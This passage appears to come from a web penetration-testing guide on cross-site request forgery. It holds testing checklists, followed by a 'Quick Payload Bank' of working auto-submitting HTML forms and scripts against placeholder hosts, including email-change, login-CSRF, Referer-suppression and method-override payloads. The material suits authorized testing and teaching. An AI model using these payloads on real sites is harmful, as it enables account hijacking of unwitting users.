* [ ] Confirmed whether authentication is cookie-based or browser-attached.
* [ ] Checked whether all parameters are predictable.
* [ ] Identified CSRF token, Origin, Referer, SameSite, custom headers, and reauthentication controls.

### Basic Testing

* [ ] Removed CSRF token.
* [ ] Sent empty CSRF token.
* [ ] Sent random CSRF token.
* [ ] Removed token parameter entirely.
* [ ] Reused old token.
* [ ] Reused token from another account.
* [ ] Tested duplicate token parameters.
* [ ] Changed POST to GET.
* [ ] Tested method override.
* [ ] Tested content-type changes.
* [ ] Confirmed actual state change, not only HTTP status.

### Browser PoC

* [ ] Built HTML form PoC.
* [ ] Tested in separate browser/profile.
* [ ] Tested while victim/test user is logged in.
* [ ] Used harmless field or test-only object.
* [ ] Checked whether SameSite prevents cookie sending.
* [ ] Checked whether Origin/Referer blocks the request.
* [ ] Checked whether action is completed without user interaction.

### SameSite

* [ ] Reviewed session cookie SameSite value.
* [ ] Tested top-level GET navigation.
* [ ] Tested whether state-changing GET exists.
* [ ] Tested method override.
* [ ] Checked sibling domains.
* [ ] Looked for on-site gadgets.
* [ ] Checked whether cookies are Domain-scoped to parent domain.

### Headers

* [ ] Tested missing Origin.
* [ ] Tested `Origin: null`.
* [ ] Tested cross-site Origin.
* [ ] Tested missing Referer.
* [ ] Tested malicious Referer with target domain in subdomain.
* [ ] Tested malicious Referer with target domain in query string.
* [ ] Tested Referrer-Policy suppression.
* [ ] Checked Fetch Metadata behavior.

### API / JSON

* [ ] Confirmed whether endpoint requires `application/json`.
* [ ] Tested `text/plain`.
* [ ] Tested `application/x-www-form-urlencoded`.
* [ ] Tested multipart.
* [ ] Checked custom header requirement.
* [ ] Checked CORS with credentials.
* [ ] Checked whether preflight is required and enforced.

### OAuth / Account Linking

* [ ] Checked `state` exists.
* [ ] Checked `state` is unpredictable.
* [ ] Checked `state` is tied to session.
* [ ] Checked `state` cannot be reused.
* [ ] Checked account linking separately from login.
* [ ] Checked whether attacker identity can be linked to victim account.

### WebSocket

* [ ] Checked WebSocket uses cookie auth.
* [ ] Checked Origin validation.
* [ ] Checked sensitive actions over socket.
* [ ] Checked whether messages can be read by attacker page.

---

## Quick Payload Bank

GET image:

```html
<img src="https://vulnerable.example/account/change-email?email=attacker@example.com">
```

Top-level GET:

```html
<script>
  document.location = "https://vulnerable.example/account/change-email?email=attacker@example.com";
</script>
```

Auto POST:

```html
<form action="https://vulnerable.example/account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

Iframe POST:

```html
<iframe name="hidden" style="display:none"></iframe>
<form action="https://vulnerable.example/profile/update" method="POST" target="hidden">
  <input type="hidden" name="displayName" value="csrf-test">
</form>
<script>
  document.forms[0].submit();
</script>
```

Multipart:

```html
<form action="https://vulnerable.example/profile/update" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="displayName" value="csrf-test">
</form>
<script>
  document.forms[0].submit();
</script>
```

text/plain:

```html
<form action="https://vulnerable.example/api/profile" method="POST" enctype="text/plain">
  <input type="hidden" name='{"displayName":"csrf-test","x":"' value='"}'>
</form>
<script>
  document.forms[0].submit();
</script>
```

Referer suppression:

```html
<meta name="referrer" content="no-referrer">
<form action="https://vulnerable.example/account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

Method override:

```html
<form action="https://vulnerable.example/account/change-email" method="GET">
  <input type="hidden" name="_method" value="POST">
  <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

Login CSRF:

```html
<form action="https://vulnerable.example/login" method="POST">
  <input type="hidden" name="username" value="attacker@example.com">
  <input type="hidden" name="password" value="attacker-password">
</form>
<script>
  document.forms[0].submit();
</script>
```

WebSocket:

```html
<script>
  const ws = new WebSocket("wss://vulnerable.example/socket");
  ws.onopen = () => {
    ws.send(JSON.stringify({ action: "ping" }));
  };
</script>
```

